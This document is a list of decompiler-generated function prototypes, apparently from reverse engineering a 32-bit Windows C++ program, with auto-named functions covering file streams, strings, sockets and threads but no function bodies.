_DWORD *__thiscall sub_41B2C0(_DWORD *this, char *a2, int a3, int a4, int a5);
int __thiscall sub_41B400(FILE **this);
_DWORD *__thiscall sub_41B470(_DWORD *this, int a2, int a3, int a4, int a5);
_DWORD *__thiscall sub_41B5C0(_DWORD *this, int a2);
int __thiscall sub_41B600(FILE **this);
FILE **__thiscall sub_41B630(FILE **this, char *Buffer, __int64 Size);
int __thiscall sub_41B680(int this, int a2, __int64 a3, __int64 a4, int a5, int a6, int a7);
int __thiscall sub_41B760(int this, int a2, __int64 a3, int Origin, int a5);
size_t __thiscall sub_41B880(int this, char *a2, __int64 a3);
size_t __thiscall sub_41BA20(int this, char *a2, __int64 a3);
int __thiscall sub_41BC00(int this);
int __thiscall sub_41BEA0(_DWORD **this);
int __thiscall sub_41BEE0(int this, int a2);
int __thiscall sub_41BF90(int this, int a2);
void __thiscall sub_41C100(int this);
int *__thiscall sub_41C1D0(int *this, int a2, __int64 a3);
int __thiscall sub_41C350(_DWORD *this);
unsigned __int64 __thiscall sub_41C370(_DWORD **this, unsigned __int8 *Src, __int64 a3);
unsigned __int64 __thiscall sub_41C450(_DWORD **this, _BYTE *a2, __int64 a3);
int __thiscall sub_41C530(_DWORD **this);
int __stdcall sub_41C560(int a1);
void __thiscall sub_41C570(_DWORD *this);
void __thiscall sub_41C5E0(struct std::ios_base *this);
_DWORD *__thiscall sub_41C640(_DWORD *this);
_DWORD *__thiscall sub_41C720(_DWORD *this, char a2);
_DWORD *__thiscall sub_41C7A0(_DWORD *this, char a2);
_DWORD *__thiscall sub_41C820(_DWORD *this, char a2);
int __thiscall sub_41C850(int this);
int __thiscall sub_41C8B0(char *this);
int __thiscall sub_41C920(int this);
_DWORD *__thiscall sub_41C980(_DWORD *this, char a2);
char *__thiscall sub_41C9F0(char *this, int a2);
_DWORD *__thiscall sub_41CA90(_DWORD *this, char a2);
char *__thiscall sub_41CAC0(char *this, int a2);
_DWORD *__thiscall sub_41CB60(_DWORD *this, char a2);
char *__thiscall sub_41CBC0(char *this, int a2);
char *__thiscall sub_41CC60(_DWORD *this, char a2);
char *__thiscall sub_41CC90(_DWORD *this, char a2);
_DWORD *__thiscall sub_41CCC0(_DWORD *this, char a2);
_DWORD *__thiscall sub_41CCF0(struct std::ios_base *this, char a2);
char *__thiscall sub_41CD70(struct std::ios_base *this, char a2);
char *__thiscall sub_41CE00(struct std::ios_base *this, char a2);
_DWORD *__thiscall sub_41CE90(_DWORD *this, char a2);
struct std::ios_base *__thiscall sub_41CF10(struct std::ios_base *this, char a2);
char *__thiscall sub_41CF80(char *this, char a2);
char *__thiscall sub_41CFB0(char *this, char a2);
void *__thiscall sub_41CFE0(void *this, char a2);
char *__thiscall sub_41D010(struct std::ios_base *this, char a2);
char *__thiscall sub_41D0A0(struct std::ios_base *this, char a2);
_DWORD *__thiscall sub_41D130(_DWORD *this, char a2);
struct std::ios_base *__thiscall sub_41D1B0(struct std::ios_base *this, char a2);
_DWORD *__thiscall sub_41D220(_DWORD *this, char a2);
void *__thiscall sub_41D2A0(void *this, char a2);
void *__thiscall sub_41D2C0(void *this, char a2);
int __thiscall sub_41D320(void *this);
int __thiscall sub_41D370(char *this);
int __thiscall sub_41D3E0(int this, char a2);
const char **__thiscall sub_41D480(const char **this, char a2);
void __thiscall sub_41D4E0(char *this);
void __thiscall sub_41D550(char *this);
int __thiscall sub_41D5C0(int this, int a2);
void __thiscall sub_41D670(void **this);
void __thiscall sub_41D6B0(int *this);
char __thiscall sub_41D730(unsigned int *this, unsigned int a2);
int __stdcall sub_41D7F0(int a1, int a2);
unsigned int __stdcall sub_41D8A0(int a1, int a2, int a3, unsigned int a4);
int __stdcall sub_41D8E0(int a1, int a2, int a3, _DWORD *a4, int a5, int a6, _DWORD *a7);
int __thiscall sub_41D900(_BYTE **this);
_BYTE *__thiscall sub_41D970(_BYTE *this, int a2);
_DWORD *__thiscall sub_41DA80(void *this, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, int a6, const void *a7);
_DWORD *__thiscall sub_41DAF0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, double X);
_DWORD *__thiscall sub_41DCB0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, double X);
_DWORD *__thiscall sub_41DE70(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, int a7, int a8);
_DWORD *__thiscall sub_41DEF0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, int a7, int a8);
_DWORD *__thiscall sub_41DF70(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, int a7);
_DWORD *__thiscall sub_41DFF0(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6, int a7);
int __thiscall sub_41E070(void *this, int a2, int a3, _DWORD *a4, _DWORD *a5, unsigned __int16 a6, unsigned __int8 a7);
int __cdecl sub_41E390(int a1);
unsigned int __thiscall sub_41E530(_DWORD *this);
_BYTE *__thiscall sub_41E5D0(_BYTE *this, int *a2);
char *__thiscall sub_41E690(char *this);
int __stdcall sub_41E7A0(unsigned int a1, int a2);
char *__thiscall sub_41E830(char *this);
int __thiscall sub_41E940(_DWORD *this);
_DWORD *__thiscall sub_41E9A0(_DWORD *this, unsigned int a2, unsigned __int16 a3);
void **__thiscall sub_41EB20(void **this, void *a2, unsigned int a3);
void __thiscall sub_41EC80(_DWORD *this);
void __thiscall sub_41ECD0(void **this);
unsigned __int8 __thiscall sub_41ED20(void **this, char a2);
const void **__thiscall sub_41ED70(char *this, unsigned int a2, char *Src, unsigned int a4);
void **__thiscall sub_41EE40(void **this, size_t Size, char a3);
void **__thiscall sub_41EF80(void **this, void *a2, size_t Size);
void **__thiscall sub_41F0C0(char *this, size_t Size, char a3);
void **__thiscall sub_41F120(char *this, void *Src, size_t Size);
// int __thiscall std::wfilebuf::_Reset_back(_DWORD); weak
char __thiscall sub_41F1B0(void *this);
int __thiscall sub_41F280(int this, int a2, int a3);
int __thiscall sub_41F310(int this);
_DWORD *__thiscall sub_41F3D0(_DWORD *this, wchar_t *a2, int a3, int a4);
_DWORD *__thiscall sub_41F4D0(_DWORD *this, int a2);
_DWORD *__thiscall sub_41F640(_DWORD *this, int a2, char a3, int a4);
__int64 __thiscall sub_41F6F0(_DWORD **this);
__int64 __thiscall sub_41F710(_DWORD **this);
int __thiscall sub_41F730(int this, char a2, char a3);
char __thiscall sub_41F760(void *this);
int __thiscall sub_41F820(int this, FILE *Stream, int a3);
_DWORD *__thiscall sub_41F920(_DWORD *this, wchar_t *a2, int a3, int a4);
_DWORD *__thiscall sub_41FA20(_DWORD *this, char *a2, int a3, int a4);
_DWORD *__thiscall sub_41FB20(_DWORD *this, FILE *a2);
_DWORD *__stdcall sub_41FC00(size_t a1);
void __stdcall sub_41FC60(void *a1, unsigned int a2);
_DWORD *__thiscall sub_41FCA0(_DWORD *this, int a2, char a3, int a4);
int __thiscall sub_41FD90(void *this, int a2, int a3, int a4);
int __fastcall sub_41FDB0(char *a1, char *a2, int a3);
_DWORD *__thiscall sub_41FE10(_DWORD *this, char a2);
_DWORD *__thiscall sub_41FE90(_DWORD *this, char a2);
int __thiscall sub_41FF00(_DWORD *this, int a2);
int __thiscall sub_41FF90(_DWORD *this, int a2);
int __thiscall sub_420020(_DWORD *this, int a2);
__int16 __thiscall sub_4200A0(_WORD *this);
__int16 __thiscall sub_4200B0(_WORD *this);
int __stdcall sub_4200C0(int a1, int a2);
void __stdcall sub_4200F0(void *a1, int a2);
void __noreturn sub_420130(void); // weak
void __stdcall sub_420140(int a1, int a2);
void __stdcall sub_420160(void *a1, int a2);
int __thiscall sub_4201A0(int *this);
_DWORD *__cdecl sub_4201F0(int a1, _DWORD *a2, int a3, _DWORD *a4, int a5, int a6);
_DWORD *__cdecl sub_420270(int a1, _DWORD *a2, int a3, _DWORD *a4, unsigned __int16 *a5, int a6);
_DWORD *__cdecl sub_420300(int a1, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, int a6, _BYTE *a7, unsigned int a8);
_BYTE *__cdecl sub_420770(int a1, _BYTE *a2, _BYTE *a3, __int16 a4);
_DWORD *__cdecl sub_420800(int a1, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, int a6, char *Str, unsigned int a8);
_BYTE *__cdecl sub_420CC0(int a1, _BYTE *a2, char a3, __int16 a4);
int __cdecl sub_420D80(int a1);
void __cdecl sub_420FD0(unsigned int a1);
void __noreturn sub_421040(void); // weak
int __thiscall sub_421050(_BYTE *this);
_DWORD *__thiscall sub_4210E0(_DWORD *this);
_DWORD *__thiscall sub_421140(_DWORD *this);
void __thiscall sub_4211D0(int this, int a2, char a3);
int *__thiscall sub_4212B0(int *this);
_DWORD *__thiscall sub_421380(_DWORD *this);
void __thiscall sub_421410(int this, int a2, char a3);
int __thiscall sub_421460(_DWORD *this, char a2, char a3);
void **__thiscall sub_421480(void **this, char a2);
// int __thiscall unknown_libname_1(_DWORD); weak
int __thiscall sub_421530(void *this, int a2);
char __thiscall sub_421590(_DWORD *this, int a2);
int *__thiscall sub_421640(int *this);
void __stdcall sub_4216A0(_DWORD *a1);
int __thiscall sub_4217C0(_DWORD **this, int a2);
// char *__usercall sub_421800@<eax>(int a1@<ebp>, int a2);
char *__cdecl sub_4219F0(int a1);
int __fastcall sub_421BF0(int a1, char *a2, int a3);
int __fastcall sub_421DC0(int a1, int a2, unsigned int *a3);
int __thiscall sub_421E60(int this, unsigned int *a2, int a3);
int __cdecl sub_421F20(int a1, char *a2, const char *a3);
int __cdecl sub_421FB0(int a1, char *a2, char *a3);
int __fastcall sub_422050(int a1, char *a2, _DWORD *a3);
int __cdecl sub_4220E0(int a1, int a2, char *a3);
int __thiscall sub_4221D0(_DWORD *this);
_DWORD *__cdecl sub_422210(_DWORD *a1, int a2, int a3, char a4);
int __thiscall sub_4223A0(int this, int a2, _DWORD *a3);
_DWORD *__fastcall sub_4224C0(_DWORD *a1, int a2, _DWORD *a3);
_DWORD *__fastcall sub_422600(_DWORD *a1, int a2, _DWORD *a3);
int __thiscall sub_422740(_DWORD **this, int a2, int a3, int a4);
_DWORD *__cdecl sub_4227B0(_DWORD *a1, int a2, _DWORD *a3, char a4);
int __fastcall sub_4228F0(int a1, int a2, void *a3);
int __fastcall sub_4229A0(int a1, _DWORD *a2, unsigned __int16 *a3);
int *sub_422A70();
_BYTE *__cdecl sub_422D50(_BYTE *a1, const char *a2);
int *__cdecl sub_422FA0(int *a1);
int *sub_422FE0();
unsigned int __cdecl sub_423200(int a1, unsigned int a2);
char __cdecl sub_4232C0(_DWORD *a1, const char *a2);
void *__thiscall sub_423340(void *this, int a2, int a3);
void *__thiscall sub_4233D0(void *this, int a2, int a3);
void *__thiscall sub_423460(void *this, int a2, int a3);
char __fastcall sub_4234F0(int *a1, const char *a2);
int __thiscall sub_423570(int this, char *a2, char *a3, int a4);
_Thrd_imp_t *__thiscall sub_4235C0(_Thrd_imp_t *this, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, int a6, _DWORD *a7, _DWORD *a8);
void (__thiscall **__cdecl sub_4237E0(int a1, int a2, void (__thiscall *a3)(int)))(int);
_Thrd_imp_t *__thiscall sub_423820(_Thrd_imp_t *this, int a2, _DWORD *a3, _DWORD *a4, _DWORD *a5, _DWORD *a6, _DWORD *a7);
int __thiscall sub_423A30(_DWORD *this, _DWORD *a2, _DWORD *a3);
char __thiscall sub_423C30(unsigned int *this, char *a2, char *a3, int a4);
_DWORD *__thiscall sub_423CD0(int *this, int a2, _DWORD *a3);
int sub_423EF0();
void **__thiscall sub_424000(void **Src, unsigned int a2, int a3);
void **__thiscall sub_424140(void **Src, int a2, int a3, __int16 a4);
void **__thiscall sub_4242A0(void **Src, unsigned int a2, int a3, const void *a4, int a5);
_DWORD *__cdecl sub_424420(int a1);
_DWORD *__cdecl sub_4245E0(int a1);
// _QWORD *__usercall sub_4247B0@<eax>(int a1@<ebp>, int a2);
_DWORD *__thiscall sub_4249A0(_DWORD *Src, unsigned int a2, int a3, unsigned int a4, unsigned __int16 a5);
void **__thiscall sub_424B40(void **Src, int a2, int a3, char a4);
const void **__thiscall sub_424C80(const void **Src, unsigned int a2, int a3, size_t Size, const void *a5, size_t a6);
void **__thiscall sub_424E00(void **Src, unsigned int a2, int a3, size_t a4, char a5);
void **__thiscall sub_424F60(void **Src, unsigned int a2, int a3, const void *a4, size_t a5);
void __fastcall sub_4250C0(int a1, int a2);
void __fastcall sub_425130(int a1, int a2);
// char *__usercall sub_4251A0@<eax>(int a1@<ebp>, int a2);
_DWORD *__thiscall sub_4253C0(_DWORD *Src, unsigned int a2, int a3, int a4, unsigned int a5, unsigned __int16 a6);
char *__thiscall sub_4255A0(char *this, int a2);
void __thiscall sub_425620(_DWORD *this);
void __thiscall sub_425700(_DWORD *this);
void __thiscall sub_425760(_DWORD *this);
void __noreturn sub_4257D0(void); // weak
int *__thiscall sub_4257E0(int *this, unsigned __int8 a2);
int __thiscall sub_425930(_DWORD **this, unsigned __int8 a2);
int __thiscall sub_425970(_DWORD *this);
int __thiscall sub_4259C0(_DWORD *this);
int __thiscall sub_425A10(_DWORD *this);
int __thiscall sub_425AC0(_DWORD *this);
int __thiscall sub_425B70(_DWORD *this);
int __thiscall sub_425C20(_DWORD *this);
int __thiscall sub_425CD0(_DWORD *this);
int __thiscall sub_425D80(_DWORD *this);
void __thiscall sub_425E30(_DWORD *this);
int __thiscall sub_425EC0(_DWORD *this);
int __thiscall sub_425FC0(_DWORD *this);
int __thiscall sub_426010(_DWORD *this);
// int __userpurge sub_4260B0@<eax>(int a1@<ecx>, int a2@<ebp>, int a3, char a4);
_BYTE *__cdecl sub_426290(_BYTE *a1, int a2);
int __stdcall sub_4264F0(int a1, _DWORD *a2, int a3);
int __stdcall sub_426510(int a1, _DWORD *a2, int a3);
int __stdcall sub_426530(int a1, _DWORD *a2, int a3);
int __cdecl sub_426550(unsigned int a1, unsigned int a2);
int __thiscall sub_4265F0(int this, int a2, int a3, char a4);
int __thiscall sub_426740(int this, int a2, _DWORD *a3, char a4);
int __thiscall sub_426840(int this, int a2, _BYTE *a3, char a4);
int __fastcall sub_426940(int a1, int a2, unsigned int a3);
int *__cdecl sub_426B10(int *a1, int a2, unsigned int a3);
_DWORD *__stdcall sub_426D00(_DWORD *a1, _DWORD *a2, _DWORD *a3);
_DWORD *__fastcall sub_426DB0(_DWORD *a1, _DWORD *a2, _DWORD *a3);
int __fastcall sub_426E50(int a1, int a2, int a3);
void **__thiscall sub_426F30(void **Src, unsigned int a2, int a3, int a4, const void *a5, int a6);
_BYTE *__cdecl sub_4270A0(const char *a1);
int __thiscall sub_4270F0(int *this);
void __thiscall sub_427140(_DWORD *this);
void __thiscall sub_427220(_DWORD *this);
int __thiscall sub_427330(int this, int a2);
char __thiscall sub_4273E0(unsigned int *this, void *a2, int a3, unsigned int *a4);
int __thiscall sub_427440(int this, int a2);
char __thiscall sub_4274F0(unsigned int *this, void *a2, int a3, unsigned int *a4);
int __thiscall sub_427550(int this, int a2);
char __thiscall sub_427600(unsigned int *this, void *a2, int a3, unsigned int *a4);
int __thiscall sub_427660(_DWORD **this);
int __thiscall sub_4276D0(_DWORD **this);
void __thiscall sub_4276F0(int this);
void __thiscall sub_4278D0(int this);
char __thiscall sub_427AC0(_BYTE *this, char a2);
int __thiscall sub_427C60(unsigned int *this);
void **__thiscall sub_427DF0(void **this, char *a2, char *a3, int a4);
WCHAR *__cdecl sub_427E80(int a1, const CHAR *a2, unsigned int a3);
const void **__thiscall sub_428030(const void **this, size_t a2, unsigned int a3, char *Src, size_t Size);
const void **__thiscall sub_4281A0(const void **Src, unsigned int a2, int a3, size_t Size, int a5, const void *a6, size_t a7);
_DWORD *__thiscall sub_428323(_DWORD *this, char a2);
_DWORD *__thiscall sub_428333(_DWORD *this, char a2);
char *__thiscall sub_42833B(_DWORD *this, char a2);
_DWORD *__thiscall sub_428343(_DWORD *this, char a2);
int __thiscall sub_42834B(_DWORD *this);
int __thiscall sub_428353(_DWORD *this);
_DWORD *__thiscall sub_428363(_DWORD *this, char a2);
_DWORD *__thiscall sub_428373(_DWORD *this, char a2);
_DWORD *__thiscall sub_42837B(_DWORD *this, char a2);
_DWORD *__thiscall sub_428383(_DWORD *this, char a2);
_DWORD *__thiscall sub_42838B(_DWORD *this, char a2);
_DWORD *__thiscall sub_428393(_DWORD *this, char a2);
void __thiscall sub_42839B(int *this, int *a2);
_DWORD *__thiscall sub_4283A3(_DWORD *this, char a2);
_DWORD *__thiscall sub_4283AB(_DWORD *this, char a2);
_DWORD *__thiscall sub_4283BB(_DWORD *this, char a2);
int __thiscall sub_4283CB(_DWORD *this, int a2);
void __thiscall sub_4283D3(int *this, int a2);
int __thiscall sub_4283E3(_DWORD *this, int a2);
_DWORD *__thiscall sub_4283EB(_DWORD *this, char a2);
char *__thiscall sub_4283F3(_DWORD *this, char a2);
char *__thiscall sub_4283FB(char *this, char a2);
_DWORD *__thiscall sub_428403(_DWORD *this, char a2);
void *__thiscall sub_428413(char *this, char a2);
_DWORD *__thiscall sub_42841B(_DWORD *this, char a2);
_DWORD *__thiscall sub_428423(_DWORD *this, char a2);
char *__thiscall sub_428433(_DWORD *this, char a2);
int __thiscall sub_42843B(_DWORD *this, int a2);
char *__thiscall sub_428443(char *this, char a2);
int __thiscall sub_42844B(_DWORD *this);
char *__thiscall sub_428453(_DWORD *this, char a2);
_DWORD *__thiscall sub_42845B(_DWORD *this, char a2);
_DWORD *__thiscall sub_428463(_DWORD *this, char a2);
char *__thiscall sub_42846B(_DWORD *this, char a2);
_DWORD *__thiscall sub_428473(_DWORD *this, char a2);
int __thiscall sub_42847B(_DWORD *this, int a2);
_DWORD *__thiscall sub_42848B(_DWORD *this, char a2);
int __thiscall sub_428493(_DWORD *this);
_DWORD *__thiscall sub_4284A3(_DWORD *this, char a2);
_DWORD *__thiscall sub_4284AB(_DWORD *this, char a2);
_DWORD *__thiscall sub_4284B3(_DWORD *this, char a2);
int __thiscall sub_4284BB(_DWORD *this);
char *__thiscall sub_4284D3(_DWORD *this, char a2);
_DWORD *__thiscall sub_4284DB(_DWORD *this, char a2);
_DWORD *__thiscall sub_4284E3(_DWORD *this, char a2);
_DWORD *__thiscall sub_4284EE(_DWORD *this, char a2);
int __thiscall sub_4284F6(_DWORD *this, int a2);
int __thiscall sub_4284FE(_DWORD *this, int a2);
_DWORD *__thiscall sub_428506(_DWORD *this, char a2);
_DWORD *__stdcall sub_42850E(_DWORD *a1);
int __thiscall sub_428516(_DWORD *this, int a2);
_DWORD *__thiscall sub_428520(_DWORD *this, int a2);
int __thiscall sub_428550(_DWORD *this);
_DWORD *__thiscall sub_4285B0(_DWORD *this, char a2);
int __thiscall sub_428630(_DWORD *this);
int *__thiscall sub_428660(int this);
int __thiscall sub_428750(_DWORD *this);
char __thiscall sub_428760(_BYTE *this);
char __thiscall sub_428770(int this, int a2);
void __stdcall sub_4287B0(int a1, int *a2);
_BYTE *__thiscall sub_428890(_BYTE *this, struct addrinfo *a2);
_BYTE *__thiscall sub_4288B0(_BYTE *this, u_long hostlong);
_BYTE *__thiscall sub_4288D0(_BYTE *this);
bool __cdecl sub_4288E0(int *a1, int *a2);
_BYTE *__cdecl sub_428910(_BYTE *a1, __int64 a2);
void __thiscall sub_428EF0(_BYTE *this, struct addrinfo *cp);
u_long __thiscall sub_428FC0(u_long *this);
int __thiscall sub_428FD0(struct in_addr *this, int a2);
char __cdecl sub_429020(int a1, int a2);
_BYTE *__fastcall sub_4290C0(_BYTE *a1, int a2, int a3);
_BYTE *__fastcall sub_429270(_BYTE *a1, int a2, int a3);
int __thiscall sub_429420(int *this, int *a2, int a3, int a4);
void *__thiscall sub_429540(void *this, int a2, int *a3);
int __cdecl sub_429590(int a1, int *a2, size_t a3, _BYTE *a4);
_DWORD *__thiscall sub_429910(_DWORD *this, _DWORD *a2, char a3, _DWORD *a4, int a5, _DWORD *a6);
_DWORD *__thiscall sub_429B40(int *this, _DWORD *a2, int *a3, int *a4, _DWORD *a5);
int __thiscall sub_429DB0(_DWORD *this, int a2, _DWORD *a3, int *a4, _DWORD *a5);
int *__thiscall sub_429F50(int *this, int *a2);
int __cdecl sub_429FB0(int a1, unsigned int a2, int a3, unsigned int a4);
_BYTE *__cdecl sub_42A040(_BYTE *a1, int a2, unsigned __int8 a3);
_DWORD *__cdecl sub_42A240(int a1);
struct std::_Facet_base *__cdecl sub_42A3A0(int a1);
_DWORD *__thiscall sub_42A4C0(_DWORD *this, _DWORD *Src, char a3, size_t Size);
int __thiscall sub_42A650(int this, size_t *a2, __int16 a3);
int __thiscall sub_42A6D0(int this);
char *__thiscall sub_42A740(char *this, size_t *a2, int a3, size_t *a4);
void __thiscall sub_42A8D0(_BYTE *this);
int *__thiscall sub_42A9A0(int *this, int a2);
int *__thiscall sub_42AC80(int *this, int *a2);
char __thiscall sub_42ADB0(_BYTE *this);
_BYTE *__thiscall sub_42AE00(_BYTE *this);
int **__thiscall sub_42AE50(int **this);
unsigned int __stdcall sub_42AEE0(int *a1, int *a2);
void __thiscall sub_42AF20(_BYTE *this);
void __thiscall sub_42AFB0(_BYTE *this);
_BYTE *__thiscall sub_42B039(_DWORD *this, char a2);
char *__thiscall sub_42B080(char *this, char a2);
_BYTE *__thiscall sub_42B0B0(_BYTE *this, char a2);
_DWORD *__thiscall sub_42B0E0(_DWORD *this, char a2);
void *__thiscall sub_42B110(void *this, char a2);
void __stdcall sub_42B160(_DWORD *a1);
_BYTE *__cdecl sub_42B180(int a1, _BYTE *a2, char a3, __int16 a4);
_DWORD *__cdecl sub_42B240(int a1, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, unsigned __int8 a6, char *Str, size_t a8);
void *__thiscall sub_42B7B0(void *this);
int __cdecl sub_42B7C0(_DWORD *a1, int a2);
int __cdecl sub_42B950(int a1, char *a2, _BYTE *a3, int a4, int a5, int *a6);
int __cdecl sub_42C5F0(int a1, _BYTE *a2, _BYTE *a3, int a4, int a5, int *a6);
int __cdecl sub_42D2C0(int a1, char *a2, _BYTE *a3, int a4, __int16 a5, int a6);
_BYTE *__cdecl sub_42D7D0(int a1, _BYTE *a2, _BYTE *a3, __int16 a4);
_DWORD *__cdecl sub_42D860(int a1, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, unsigned __int8 a6, _BYTE *a7, size_t a8);
_DWORD *__cdecl sub_42DD60(int a1, _DWORD *a2, int a3, _DWORD *a4, unsigned __int8 *a5, int a6);
_DWORD *__cdecl sub_42DDE0(int a1, _DWORD *a2, int a3, _DWORD *a4, unsigned __int8 a5, int a6);
int __thiscall sub_42DE50(_DWORD *this, int a2);
_DWORD *__thiscall sub_42DE90(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, _WORD *a9);
int *__thiscall sub_42DFE0(void *this, int *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, _DWORD *a9);
_DWORD *__thiscall sub_42E110(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, _DWORD *a9);
_DWORD *__thiscall sub_42E230(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, _DWORD *a9);
// _DWORD *__userpurge sub_42E350@<eax>(int a1@<ecx>, double a2@<st0>, _DWORD *a3, int a4, int a5, char a6, int a7, int a8, _DWORD *a9, float *a10);
// _DWORD *__userpurge sub_42E4D0@<eax>(int a1@<ecx>, double a2@<st0>, _DWORD *a3, int a4, int a5, char a6, int a7, int a8, _DWORD *a9, double *a10);
// int *__userpurge sub_42E640@<eax>(int a1@<ecx>, double a2@<st0>, int a3, int a4, int a5, int a6, int a7, int a8, _DWORD *a9, int a10);
_DWORD *__thiscall sub_42E810(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, _DWORD *a9);
_DWORD *__thiscall sub_42E930(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, __int64 *a9);
_DWORD *__thiscall sub_42EA60(void *this, _DWORD *a2, int a3, int a4, char a5, int a6, int a7, _DWORD *a8, __int64 *a9);
_DWORD *__thiscall sub_42EB90(char *this, _DWORD *a2, int a3, int a4, int a5, int a6, int a7, _DWORD *a8, bool *a9);
int __thiscall sub_42EE70(_DWORD *this, int a2);
_DWORD *__thiscall sub_42EF90(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, double a7);
_DWORD *__thiscall sub_42F150(void *this, _DWORD *a2, int a3, _DWORD *a4, int a5, unsigned __int8 a6, double a7);
_DWORD *__thiscall sub_42F310(void *this, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, unsigned __int8 a6, const void *a7);
_DWORD *__thiscall sub_42F450(void *this, _DWORD *a2, int a3, _DWORD *a4, __int64 *a5, char a6, unsigned __int8 a7);
char __thiscall sub_42F630(_BYTE *this);
int __thiscall sub_42F640(_DWORD *this, int a2);
char *__thiscall sub_42F680(char *this);
bool __thiscall sub_42F690(int *this, _DWORD *a2);
int __thiscall sub_42F760(int this, __int64 a2, int a3);
int __thiscall sub_42F930(int this, int a2);
void __thiscall sub_42FA90(int this, _DWORD *a2);
void __thiscall sub_430250(int *this, int a2);
int __thiscall sub_430750(int this, int a2);
int __thiscall sub_4307B0(_DWORD ***this, int a2);
_DWORD *__thiscall sub_430AE0(int this, _DWORD *a2, __int64 a3, int a4, char a5);
_DWORD *__thiscall sub_430C50(int this, _DWORD *a2, __int64 a3, __int64 a4, int a5, int a6, char a7);
int __thiscall sub_430D40(size_t *this, int a2, _DWORD **a3, __int64 a4);
void **__thiscall sub_431B00(void **this, int a2);
void __thiscall sub_431B30(int *this, _DWORD *a2, size_t *a3);
int __thiscall sub_431C00(int this, size_t *a2, __int16 a3);
int __thiscall sub_431F20(_DWORD *this, int a2, int a3);
int __thiscall sub_431F40(_DWORD *this, int a2);
const void **__thiscall sub_431F50(void **this, size_t *a2);
int __thiscall sub_431FB0(int this, int a2);
int __cdecl sub_432070(int a1, __int128 a2, __int64 a3);
int __thiscall sub_4320E0(int this);
int __cdecl sub_432140(SOCKET s);
int __cdecl sub_432150(int a1, u_long hostlong, u_short hostshort);
int sub_432190();
int __cdecl sub_4321F0(SOCKET s, int argp);
_DWORD *__thiscall sub_432220(_DWORD *this);
_DWORD *__thiscall sub_432270(_DWORD *this, _DWORD *a2);
_DWORD *__thiscall sub_432310(_DWORD *this, char a2);
int __thiscall sub_432380(_DWORD *this, u_long *a2, u_short a3, __int64 a4);
void __thiscall sub_432610(_DWORD *this);
int __thiscall sub_432690(_DWORD *this, char *buf, int len, int *a4);
int __thiscall sub_432700(_BYTE *this, int a2, unsigned int a3);
int __thiscall sub_432750(_DWORD *this, int a2, unsigned int a3, unsigned int *a4);
unsigned int __cdecl sub_4327F0(_DWORD *a1);
int __cdecl sub_432830(unsigned int *a1);
int __thiscall sub_432890(const void **this, _BYTE *Src, _DWORD *a3);
int __thiscall sub_432970(int this, unsigned int a2, int a3);
char *__thiscall sub_432A00(char *this, int a2);
char *__thiscall sub_432A90(char *this);
int *__thiscall sub_432B70(int *this, int a2, char a3);
_DWORD *__thiscall sub_432BF0(_DWORD *this, int a2, char a3);
void __thiscall sub_432C40(void *this);
void __thiscall sub_432CF0(int this);
void *__thiscall sub_432D75(char *this, char a2);
void *__thiscall sub_432D7D(char *this, char a2);
void *__thiscall sub_432D85(char *this, char a2);
_DWORD *__thiscall sub_432D90(_DWORD *this, char a2);
void *__thiscall sub_432DB0(void *this, char a2);
void *__thiscall sub_432DD0(void *this, char a2);
void *__thiscall sub_432DF0(void *this, char a2);
bool __thiscall sub_432E10(_DWORD *this);
int __thiscall sub_432E20(int *this, int a2);
void __thiscall sub_432F90(int *this, int *a2);
void __thiscall sub_433390(int *this, void *a2);
void __thiscall sub_4336A0(_DWORD *this, int a2);
void __fastcall __noreturn sub_433790(_DWORD); // weak
char __cdecl sub_4337C0(int a1);
void __thiscall sub_433800(void *this, int a2);
char __cdecl sub_433820(int a1, _DWORD *a2);
char __cdecl sub_433890(int a1, int *a2, _BYTE *a3);
int __thiscall sub_433970(int this, int a2, int a3, unsigned int a4, unsigned int a5, int a6, int a7);
void __thiscall sub_4339C0(_DWORD *this, int a2);
void __thiscall sub_433BB0(int *this, int a2);
void __thiscall sub_433D80(int *this, int a2);
int __cdecl sub_433EF0(int *a1);
int __cdecl sub_433F30(int *a1, int a2, unsigned int a3);
int __thiscall sub_433F80(_DWORD *this, int a2);
int __cdecl sub_433FC0(int *a1, unsigned __int64 a2);
void __cdecl sub_434090(int a1, int a2);
__int64 __thiscall sub_4341F0(int this);
int __thiscall sub_434210(int this);
int __thiscall sub_434250(int this);
int __thiscall sub_4342D0(int this, int a2, unsigned int *a3, int a4, int a5);
int __thiscall sub_434350(_DWORD *this, int a2, int a3, int a4);
_DWORD *__stdcall sub_4343B0(unsigned int a1);
int __cdecl sub_434410(int a1, unsigned int a2, unsigned int a3);
char *__thiscall sub_4346F0(char *this, int a2);
char *__thiscall sub_434780(char *this, int a2);
char *__thiscall sub_434810(char *this);
void __thiscall sub_4348E0(_DWORD *this);
void __thiscall sub_4348F0(void *this);
_DWORD *__thiscall sub_434A01(_DWORD *this, char a2);
void *__thiscall sub_434A09(char *this, char a2);
void *__thiscall sub_434A11(char *this, char a2);
_DWORD *__thiscall sub_434A20(_DWORD *this, char a2);
void *__thiscall sub_434A50(void *this, char a2);
int __thiscall sub_434A70(_DWORD **this, int a2);
unsigned int __thiscall sub_434A90(_DWORD *this);
int __stdcall sub_434AD0(_DWORD *a1);
int __thiscall sub_434AE0(_DWORD **this);
